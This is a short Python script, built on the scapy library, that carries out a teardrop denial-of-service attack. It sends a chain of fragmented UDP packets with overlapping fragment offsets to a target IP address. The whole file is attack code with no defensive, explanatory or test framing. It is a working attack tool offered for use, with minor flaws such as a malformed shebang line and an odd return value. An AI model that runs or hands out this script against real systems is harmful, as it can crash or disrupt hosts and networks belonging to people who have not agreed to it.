#!usr/bin/env python
import sys
from scapy.all import *




# Sending multiple fragmented Packets with ovelapped offsets
def TearDrop(Ip,Interface):
    print "The teardrop attack is initiating %s" %Ip
    size=800
    offset=3
    load="\x00"*size
    i=IP()/UDP(dport=80)
    i.dst=Ip
    i.flags="MF"
    i.proto=17
    send(i/load,verbose=0,iface=Interface)

    for k in range(10):
        i.frag=offset
        offset+=20
        send(i/load,verbose=0,iface=Interface)

    i.flags=0
    i.frag=offset
    send(i/load,verbose=0,iface=Interface)

 
    return 007



